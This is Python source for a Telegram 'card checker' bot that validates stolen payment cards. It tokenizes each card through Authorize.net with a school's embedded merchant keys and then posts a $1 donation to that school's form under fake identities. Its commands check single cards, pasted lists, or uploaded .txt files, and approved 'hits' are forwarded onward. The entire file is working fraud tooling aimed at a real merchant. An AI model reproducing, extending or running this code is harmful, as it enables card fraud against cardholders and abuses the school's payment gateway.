import time
import asyncio
import re
import os
import uuid
import random
import httpx
from faker import Faker
from pyrogram import Client, filters, enums

# ==========================================
# --- IMPORTS FROM YOUR BOT ENVIRONMENT ---
# ==========================================
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

# ==========================================
# --- CONFIGURATION & INITIALIZATION ---
# ==========================================
fake = Faker()
MAX_MSC_LIMIT = 10 
MAX_TSC_LIMIT = 100

# Authorize.net Gateway Details
CLIENT_KEY = "88uBHDjfPcY77s4jP6JC5cNjDH94th85m2sZsq83gh4pjBVWTYmc4WUdCW7EbY6F"
API_LOGIN_ID = "93HEsxKeZ4D"
BASE_URL = "https://www.jetsschool.org"
FORM_ID = "6913"
AUTHORIZE_API_URL = "https://api2.authorize.net/xml/v1/request.api"
GATEWAY_NAME = "CC Charge"

# ==========================================
# --- UTILITY FUNCTIONS ---
# ==========================================

def get_fake_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/112.0.0.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
    ]
    return random.choice(user_agents)

def extract_cards(text):
    pattern = r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}"
    return re.findall(pattern, text)

# ==========================================
# --- CORE AUTHORIZE.NET LOGIC ---
# ==========================================

async def call_authorize_api(fullcc):
    """Handles the tokenization and donation submission logic."""
    try:
        parts = re.split(r'[|:,\s]+', fullcc.strip())
        cc, mes, ano, cvv = parts[0], parts[1], parts[2][-2:], parts[3]
    except (IndexError, ValueError):
        return "Error", "Invalid CC Format", GATEWAY_NAME

    ua = get_fake_user_agent()
    
    async with httpx.AsyncClient(timeout=45, follow_redirects=True) as session:
        # --- STEP 1: TOKENIZATION ---
        expire_token = f"{mes}{ano}"
        timestamp = str(int(time.time() * 1000))
        
        token_payload = {
            "securePaymentContainerRequest": {
                "merchantAuthentication": {"name": API_LOGIN_ID, "clientKey": CLIENT_KEY},
                "data": {
                    "type": "TOKEN",
                    "id": timestamp,
                    "token": {"cardNumber": cc, "expirationDate": expire_token, "cardCode": cvv}
                }
            }
        }
        
        token_headers = {
            "Content-Type": "application/json", 
            "Origin": BASE_URL, 
            "Referer": f"{BASE_URL}/", 
            "User-Agent": ua
        }
        
        try:
            resp = await session.post(AUTHORIZE_API_URL, json=token_payload, headers=token_headers)
            data = resp.json()
            if data.get("messages", {}).get("resultCode") == "Ok":
                descriptor = data["opaqueData"]["dataDescriptor"]
                value = data["opaqueData"]["dataValue"]
            else:
                msg = data.get("messages", {}).get("message", [{}])[0].get("text", "Tokenization Failed")
                return "Declined ✗", msg, GATEWAY_NAME
        except Exception:
            return "Error", "Tokenization Connection Failed", GATEWAY_NAME

        # --- STEP 2: SUBMIT DONATION ---
        fn, ln = fake.first_name(), fake.last_name()
        email = f"{fn.lower()}.{ln.lower()}{random.randint(100,999)}@gmail.com"
        
        submit_data = {
            "give-form-id": FORM_ID,
            "give-form-title": "Donate",
            "give-amount": "1.00",
            "payment-mode": "authorize",
            "give_first": fn,
            "give_last": ln,
            "give_email": email,
            "give_authorize_data_descriptor": descriptor,
            "give_authorize_data_value": value,
            "give_action": "purchase",
            "give-gateway": "authorize",
            "card_address": fake.street_address(),
            "card_city": fake.city(),
            "card_state": fake.state_abbr(),
            "card_zip": fake.zipcode(),
            "billing_country": "US",
            "card_number": "0000000000000000",
            "card_cvc": "000",
            "card_name": "0000000000000000",
            "card_exp_month": "00",
            "card_exp_year": "00",
            "card_expiry": "00 / 00"
        }

        try:
            # Fetch form hash
            page_resp = await session.get(f"{BASE_URL}/donate/?form-id={FORM_ID}")
            hash_match = re.search(r'name="give-form-hash" value="(.*?)"', page_resp.text)
            if hash_match:
                submit_data["give-form-hash"] = hash_match.group(1)
            
            # Submit final charge
            final_resp = await session.post(f"{BASE_URL}/donate/?payment-mode=authorize&form-id={FORM_ID}", data=submit_data)
            resp_text = final_resp.text.lower()
            
            if any(x in resp_text for x in ["donation confirmation", "thank you", "payment complete"]):
                return "Approved ✓", "CHARGED 1$ - APPROVED", GATEWAY_NAME
            else:
                err_match = re.search(r'class="give_error">(.*?)<', final_resp.text)
                err_msg = err_match.group(1) if err_match else "Transaction Declined"
                return "Declined ✗", err_msg, GATEWAY_NAME
        except Exception:
            return "Error", "Submission Connection Failed", GATEWAY_NAME

# ==========================================
# --- MASS PROCESSING LOGIC ---
# ==========================================

async def process_sequential_check(Client, message, ccs, user_id, first_name, role):
    """Handles the progress and final display for mass and text checks."""
    progress_msg = await message.reply(
        f"✧ <b>ꜱᴘʏᴅᴇ ━ ᴍᴀꜱꜱ ᴄʜᴇᴄᴋ</b> ✧\n\n💠 𝙂𝙖𝙩𝙚 -» {GATEWAY_NAME}\n💠 𝘾𝘾 𝘼𝙢𝙤𝙪𝙣𝙩 -» {len(ccs)}\n💠 𝙎𝙩𝙖𝙩𝙪𝙨 -» Processing...", 
        quote=True, 
        parse_mode=enums.ParseMode.HTML
    )
    
    final_text = f"✧ <b>ꜱᴘʏᴅᴇ ━ ᴍᴀꜱꜱ ᴄʜᴇᴄᴋ</b> ✧\n━━━━━━━━━━━━━━━━━━━━\n"
    start_time = time.perf_counter()
    
    for fullcc in ccs:
        status, response, gateway = await call_authorize_api(fullcc)
        
        # Get BIN Info
        cc_num = fullcc.split("|")[0]
        getbin = await get_bin_details(cc_num)
        brand, type_, level, bank, country, flag = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5]
        
        final_text += (
            f"💠 𝘾𝙘-» <code>{fullcc}</code>\n"
            f"💠 𝙎𝙩𝙖𝙩𝙪𝙨-» {status}\n"
            f"💠 𝙍𝙚𝙨𝙪𝙡𝙩-» {response} 💎\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
        )
        
        try:
            await progress_msg.edit_text(final_text, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
        except:
            pass
        await asyncio.sleep(0.5)

    elapsed = round(time.perf_counter() - start_time, 2)
    footer = (
        f"════『 META 』════\n"
        f"💠 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» {GATEWAY_NAME}\n"
        f"💠 𝙏𝙞𝙢𝙚-» {elapsed}s\n"
        f"💠 𝘾𝙝𝙚𝙘𝙠𝙚checked 𝙗𝙮-» <a href='tg://user?id={user_id}'>{first_name}</a> ↯\n"
        f"{role}\n"
        f"════『 OWNER 』════\n"
        f"      <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"
    )
    
    await progress_msg.edit_text(final_text + footer, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
    await setantispamtime(user_id)

# ==========================================
# --- COMMAND HANDLERS ---
# ==========================================

# --- SINGLE CHECK: /az ---
@Client.on_message(filters.command("az", [".", "/"]))
async def az_single_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        
        # Security & Data checks
        checkall = await check_all_thing(Client, message)
        if not checkall[0]: return
        role = checkall[1]
        
        getcc = await getmessage(message)
        if not getcc:
            resp = (
                f"✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦\n▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰\n\n"
                f"⟢ <b>ɢᴀᴛᴇ :</b> {GATEWAY_NAME}\n◈ <b>ᴄᴍᴅ :</b> /az\n\n"
                f"⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗\n\n"
                f"↪ <b>ᴜꜱᴀɢᴇ :</b> /az cc|mes|ano|cvv\n━━━━━━━━━━━━━━━━━━━━"
            )
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return
            
        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        
        # Initial Progress
        first_resp = f"✧ ᴄʜᴇᴄᴋɪɴɢ. ✧\n\n💠 𝘾𝙘-» <code>{fullcc}</code>\n💠 𝙂𝙖𝙩𝙚-» <i>{GATEWAY_NAME}</i>\n💠 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚-» ■□□□"
        status_msg = await message.reply_text(first_resp, quote=True, parse_mode=enums.ParseMode.HTML)
        
        await asyncio.sleep(0.5)
        await Client.edit_message_text(message.chat.id, status_msg.id, first_resp.replace("■□□□", "■■■□"), parse_mode=enums.ParseMode.HTML)
        
        # Execution
        start = time.perf_counter()
        status, response, _ = await call_authorize_api(fullcc)
        
        # Get Info
        getbin = await get_bin_details(cc)
        brand, type_, level, bank, country, flag = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5]

        final_resp = (
            f"💠 𝘾𝙘-» <code>{fullcc}</code>\n"
            f"💠 𝙎𝙩𝙖𝙩𝙪𝙨-» {status}\n"
            f"💠 𝙍𝙚𝙨𝙪𝙡𝙩-» {response} 💎\n"
            f"════『 INFO 』════\n"
            f"<blockquote expandable>💠 𝘾𝙤𝙪𝙣𝙩𝙧𝙮-» {country} {flag}\n"
            f"💠 𝘽𝙞𝙣-» {brand}\n"
            f"_{type_}-{level}\n"
            f"💠 𝘽𝙖𝙣𝙠-» {bank}</blockquote>\n"
            f"════『 META 』════\n"
            f"💠 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» {GATEWAY_NAME}\n"
            f"💠 𝙏𝙞𝙢𝙚-» {time.perf_counter() - start:0.2f}s\n"
            f"💠 𝘾𝙝𝙚𝙘𝙠𝙚checked 𝙗𝙮-» <a href='tg://user?id={user_id}'>{first_name}</a> ↯\n"
            f"{role}\n"
            f"════『 OWNER 』════\n"
            f"      <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"
        )
        
        await Client.edit_message_text(message.chat.id, status_msg.id, final_resp, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
        
        # Final cleanup
        await setantispamtime(user_id)
        await deductcredit(user_id)
        if "Approved" in status:
            await send_hit_if_approved(Client, final_resp)
            
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# --- MASS CHECK: /maz ---
@Client.on_message(filters.command("maz", [".", "/"]))
async def maz_mass_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        checkall = await check_all_thing(Client, message)
        if not checkall[0]: return
        
        ccs = extract_cards(message.reply_to_message.text if message.reply_to_message else message.text)
        if not ccs:
            await message.reply_text("✦ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ✗ ✦", quote=True)
            return
            
        if len(ccs) > MAX_MSC_LIMIT:
            ccs = ccs[:MAX_MSC_LIMIT]
            
        await process_sequential_check(Client, message, ccs, user_id, message.from_user.first_name, checkall[1])
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# --- TXT FILE CHECK: /taz ---
@Client.on_message(filters.command("taz", [".", "/"]))
async def taz_txt_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        checkall = await check_all_thing(Client, message)
        if not checkall[0]: return
        
        target = message.reply_to_message if message.reply_to_message and message.reply_to_message.document else message
        if not target or not target.document or not target.document.file_name.endswith(".txt"):
            await message.reply_text("✦ ᴜᴘʟᴏᴀᴅ ᴀ .ᴛxᴛ ꜰɪʟᴇ ✗ ✦", quote=True)
            return
            
        file_path = await Client.download_media(target)
        with open(file_path, "r") as f:
            ccs = extract_cards(f.read())
        os.remove(file_path)
        
        if not ccs:
            await message.reply_text("✦ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ✗ ✦", quote=True)
            return
            
        if len(ccs) > MAX_TSC_LIMIT:
            ccs = ccs[:MAX_TSC_LIMIT]
            
        await process_sequential_check(Client, message, ccs, user_id, message.from_user.first_name, checkall[1])
    except Exception:
        import traceback
        await error_log(traceback.format_exc())
